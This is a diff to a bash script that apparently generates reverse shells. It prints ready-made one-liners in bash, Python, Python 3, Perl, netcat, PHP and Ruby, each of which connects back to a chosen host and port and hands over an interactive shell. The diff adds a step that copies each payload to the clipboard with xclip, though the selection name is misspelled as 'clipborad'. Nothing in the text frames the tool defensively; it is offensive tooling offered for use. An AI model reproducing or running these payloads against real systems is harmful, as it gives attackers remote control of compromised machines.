@@ -1,7 +1,7 @@
 #!/bin/bash
 
 #List of prerewuisite tools
-required_tools=("lolcat" "toilet")
+required_tools=("lolcat" "toilet" "xclip")
 
 #Function to check if a tool is installed
 check_tool(){
@@ -70,25 +70,39 @@ while true; do
 
     case "$option" in
       1)
-        echo "bash -i >& /dev/tcp/$host/$port 0>&1" | lolcat 
+        echo "bash -i >& /dev/tcp/$host/$port 0>&1" | lolcat
+	      echo "bash -i >& /dev/tcp/$host/$port 0>&1" | xclip -selection clipborad  
+        echo "Code copied to clipborad!!"
         ;;
       2)
-        echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$host\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" | lolcat 
+        echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$host\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" | lolcat   
+        echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$host\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" | xclip -selection clipborad  
+        echo "Code copied to clipborad!!"
         ;;
       3)
         echo "export RHOST=\"$host\";export RPORT=$port;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"sh\")'" | lolcat 
+        echo "export RHOST=\"$host\";export RPORT=$port;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"sh\")'" | xclip -selection clipborad 
+        echo "Code copied to clipborad!!"
         ;;
       4)
         echo "perl -e 'use Socket;\$i=\"$host\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" | lolcat 
+        echo "perl -e 'use Socket;\$i=\"$host\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" | xclip -selection clipborad 
+        echo "Code copied to clipborad!!"
         ;;
       5)
         echo "nc -e /bin/sh $host $port" | lolcat 
+        echo "nc -e /bin/sh $host $port" | xclip -selection clipborad 
+        echo "Code copied to clipborad!!"
         ;;
       6)
         echo "php -r '\$sock=fsockopen(\"$host\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" | lolcat 
+        echo "php -r '\$sock=fsockopen(\"$host\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" | xclip -selection clipborad 
+        echo "Code copied to clipborad!!"
         ;;
       7)
-        echo "ruby -rsocket -e'f=TCPSocket.open(\"$host\",$port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" | lolcat
+        echo "ruby -rsocket -e'f=TCPSocket.open(\"$host\",$port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" | lolcat 
+        echo "ruby -rsocket -e'f=TCPSocket.open(\"$host\",$port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" | xclip -selection clipborad 
+        echo "Code copied to clipborad!!"
         ;;
     esac
   }
